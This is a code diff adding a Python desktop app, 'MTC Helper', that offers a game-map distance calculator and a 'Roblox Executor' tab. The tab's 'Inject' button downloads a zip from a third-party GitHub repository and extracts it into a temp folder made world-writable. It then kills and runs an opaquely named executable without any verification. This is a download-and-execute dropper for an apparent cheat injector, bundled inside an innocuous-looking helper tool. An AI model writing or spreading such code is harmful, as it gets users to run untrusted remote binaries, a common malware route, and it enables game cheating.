@@ -1,0 +1,243 @@
+import threading
+from customtkinter import *
+from customtkinter.windows.widgets.core_widget_classes.ctk_base_class import CTkImage
+from tkinter import Canvas
+from PIL import Image, ImageTk
+from math import sqrt
+import pygetwindow as gw
+import os
+import requests
+import zipfile
+import shutil
+import subprocess
+import tempfile
+import stat
+import time
+
+version = "1.0"
+
+class App(CTk):
+    def __init__(self):
+        super().__init__()
+        self.title(" ")
+        self.geometry("1050x900")
+        self.resizable(False, False)
+
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_columnconfigure(1, weight=1)
+
+        self.navigation_frame = CTkFrame(self, corner_radius=0)
+        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
+        self.navigation_frame.grid_rowconfigure(8, weight=1)
+
+        self.navigation_frame_label = CTkLabel(self.navigation_frame, text="MTC Helper",
+                                               compound="left", font=CTkFont(size=20, weight="bold"))
+        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)
+
+        # self.home_button = CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Home",
+        #                              fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
+        #                              anchor="w", command=self.home_button_event)
+        # self.home_button.grid(row=1, column=0, sticky="ew")
+
+        self.map_frame_button = CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Map Calculator",
+                                          fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
+                                          anchor="w", command=self.map_frame_button_event)
+        self.map_frame_button.grid(row=2, column=0, sticky="ew")
+
+        self.misc_frame_button = CTkButton(self.navigation_frame, corner_radius=0, height=40,
+                                           border_spacing=10, text="Roblox Executor",
+                                           fg_color="transparent", text_color=("gray10", "gray90"),
+                                           hover_color=("gray70", "gray30"),
+                                           anchor="w", command=self.misc_frame_button_event)
+        self.misc_frame_button.grid(row=4, column=0, sticky="ew")
+
+        self.appearance_mode_menu = CTkOptionMenu(self.navigation_frame, values=["Dark", "Light"],
+                                                  command=self.change_appearance_mode_event)
+        self.appearance_mode_menu.grid(row=8, column=0, padx=20, pady=20, sticky="s")
+
+        self.misc_frame = CTkFrame(self, corner_radius=0, fg_color="transparent")
+        self.map_frame = CTkFrame(self, corner_radius=0, fg_color="transparent")
+
+        # self.home_frame = CTkFrame(self, corner_radius=0, fg_color="transparent")
+        # self.home_frame.grid_columnconfigure(0, weight=1)
+
+        self.inject_executor_button = CTkButton(self.misc_frame, fg_color='red', text='Inject', command=self.inject_executor)
+        self.inject_executor_button.grid(row=1, column=1, padx=350, pady=15)
+
+        self.warning_label = CTkLabel(self.misc_frame, text='Warning!\nUse on your own risk!\nTheres a chance, that you will get banned\n\n(нажми 1 раз, и жди 5 секунд)')
+        self.warning_label.grid(row=2, column=1, padx=20, pady=0)
+
+        self.map_select = CTkOptionMenu(self.map_frame, values=["Muddy Fields", "Dustbowl", "Sokolovka", "Radar Station", "Powerplant", "Arctic Airbase", "Normandy Bocage", "Roinburg", "Villers-Sommeil"], command=self.update_map_image)
+        self.map_select.grid(row=1, column=1, padx=20, pady=10)
+
+        self.map_image_label = CTkLabel(self.map_frame, text='')
+        self.map_image_label.grid(row=2, column=1, padx=20, pady=10, sticky="nsew")
+
+        self.map_images = {
+            "Muddy Fields": "maps/muddy_fields.png",
+            "Dustbowl": "maps/dustbowl.png",
+            "Sokolovka": "maps/sokolovka.png",
+            "Radar Station": "maps/radar_station.png",
+            "Powerplant": "maps/powerplant.png",
+            "Arctic Airbase": "maps/arctic_airbase.png",
+            "Normandy Bocage": "maps/normandy.png",
+            "Roinburg": "maps/roinburg.png",
+            "Villers-Sommeil": "maps/villers_sommeil.png"
+        }
+
+        self.map_configs = {
+            "Muddy Fields": {"size": (1148, 1148), "scale_factor": 240},
+            "Dustbowl": {"size": (1139, 1141), "scale_factor": 138},
+            "Sokolovka": {"size": (1141, 1143), "scale_factor": 556},
+            "Radar Station": {"size": (1139, 1143), "scale_factor": 255},
+            "Roinburg": {"size": (1139, 1143), "scale_factor": 394},
+            "Villers-Sommeil": {"size": (1137, 1141), "scale_factor": 333},
+            "Arctic Airbase": {"size": (1135, 1141), "scale_factor": 449},
+            "Normandy Bocage": {"size": (1141, 1143), "scale_factor": 664},
+            "Powerplant": {"size": (1145, 1143), "scale_factor": 449},
+        }
+
+        self.canvas = Canvas(self.map_frame, highlightthickness=0, bd=0, bg='gray14')
+        self.canvas.grid(row=3, column=1, padx=0, pady=0)
+        self.canvas.bind("<Button-1>", self.on_canvas_click)
+
+        self.points = []
+        self.current_scale_factor = 1
+
+        self.select_frame_by_name("map")
+
+    def select_frame_by_name(self, name):
+        # self.home_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
+        self.misc_frame_button.configure(fg_color=("gray75", "gray25") if name == "misc" else "transparent")
+        self.map_frame_button.configure(fg_color=("gray75", "gray25") if name == "map" else "transparent")
+
+        # if name == "home":
+        #     self.home_frame.grid(row=0, column=1, sticky="nsew")
+        # else:
+        #     self.home_frame.grid_forget()
+
+        if name == "misc":
+            self.misc_frame.grid(row=0, column=1, sticky="nsew")
+        else:
+            self.misc_frame.grid_forget()
+
+        if name == "map":
+            self.map_frame.grid(row=0, column=1, sticky="nsew")
+        else:
+            self.map_frame.grid_forget()
+
+    # def home_button_event(self):
+    #     self.select_frame_by_name("home")
+
+    def misc_frame_button_event(self):
+        self.select_frame_by_name("misc")
+
+    def map_frame_button_event(self):
+        self.select_frame_by_name("map")
+
+    def change_appearance_mode_event(self, new_appearance_mode):
+        set_appearance_mode(new_appearance_mode)
+
+    def update_map_image(self, *args):
+        selected_map = self.map_select.get()
+        map_image_path = self.map_images.get(selected_map)
+        map_config = self.map_configs.get(selected_map)
+
+        if map_image_path and map_config:
+            original_image = Image.open(map_image_path)
+            
+            display_size = (map_config["size"][0] // 2, map_config["size"][1] // 2)
+            resized_image = original_image.resize(display_size, Image.LANCZOS)
+            
+            self.map_image = ImageTk.PhotoImage(resized_image)
+            self.canvas.create_image(0, 0, anchor="nw", image=self.map_image)
+            self.canvas.image = self.map_image
+            self.current_scale_factor = map_config["scale_factor"]
+            
+            self.canvas.config(width=display_size[0], height=display_size[1])
+
+    def on_canvas_click(self, event):
+        display_scale_factor = 2
+        x, y = event.x * self.current_scale_factor / 138 * display_scale_factor, event.y * self.current_scale_factor / 138 * display_scale_factor
+        self.points.append((x, y))
+        
+        self.canvas.create_oval(event.x - 5, event.y - 5, event.x + 5, event.y + 5, fill='red')
+        
+        if len(self.points) == 2:
+            x0, y0 = self.points[0]
+            x1, y1 = self.points[1]
+            distance = self.calculate_distance(x0, y0, x1, y1)
+            
+            display_x0, display_y0 = x0 / (self.current_scale_factor / 138) / display_scale_factor, y0 / (self.current_scale_factor / 138) / display_scale_factor
+            display_x1, display_y1 = x1 / (self.current_scale_factor / 138) / display_scale_factor, y1 / (self.current_scale_factor / 138) / display_scale_factor
+            
+            self.canvas.create_line(display_x0, display_y0, display_x1, display_y1, fill='blue')
+            self.canvas.create_text((display_x0 + display_x1) / 2, (display_y0 + display_y1) / 2, text=f"{distance:.2f} units", fill='white', font=('Helvetica', 12))
+            self.points = []
+
+    def calculate_distance(self, x0, y0, x1, y1):
+        return sqrt((x1 - x0) ** 2 + (y1 - y0) ** 2)
+    
+    def inject_executor(self):
+        threading.Thread(target=self.inject_executor_threaded).start()
+
+    def download_file(self, url, dest):
+        os.system('cls')
+        print("[ + ] Загрузка файлов...")
+        try:
+            response = requests.get(url, stream=True)
+            response.raise_for_status()
+            with open(dest, 'wb') as f:
+                shutil.copyfileobj(response.raw, f)
+        except requests.RequestException as e:
+            raise
+
+    def extract_zip(self, file_path, extract_to):
+        try:
+            with zipfile.ZipFile(file_path, 'r') as zip_ref:
+                zip_ref.extractall(extract_to)
+        except zipfile.BadZipFile as e:
+            raise
+
+    def set_permissions(self, directory):
+        try:
+            for root, dirs, files in os.walk(directory):
+                for dir in dirs:
+                    dir_path = os.path.join(root, dir)
+                    os.chmod(dir_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    os.chmod(file_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)
+        except Exception as e:
+            print("Запустите MTCHelper от имени администратора.")
+
+    def inject_executor_threaded(self):
+        version_url = 'https://raw.githubusercontent.com/quivings/Solara/main/Storage/version.txt'
+        zip_url = 'https://github.com/quivings/Solara/raw/main/Files/Solara.Dir.zip'
+        
+        try:
+            temp_dir = tempfile.mkdtemp()
+            self.set_permissions(temp_dir)
+            self.download_file(version_url, os.path.join(temp_dir, 'version.txt'))
+            self.zip_path = os.path.join(temp_dir, 'Solara.Dir.zip')
+            self.download_file(zip_url, self.zip_path)
+            self.extract_zip(self.zip_path, temp_dir)
+            
+            exe_path = os.path.join(temp_dir, 'Solara.Dir/cd57e4c171d6e8f5ea8b8f824a6a7316.exe')
+            if os.path.exists(exe_path):
+                time.sleep(1.5)
+                exe_name = os.path.basename(exe_path)
+                subprocess.run(f'taskkill /F /IM {exe_name}')
+                os.system('cls')
+                print("[ + ] Загрузка файлов...")
+                print("[ + ] Успешно!")
+                os.system(exe_path)
+                shutil.rmtree(temp_dir)
+            else:
+                pass
+        except Exception as e:
+            print(f"Ошибка: {e}")
+
+if __name__ == "__main__":
+    app = App()
+    app.mainloop()
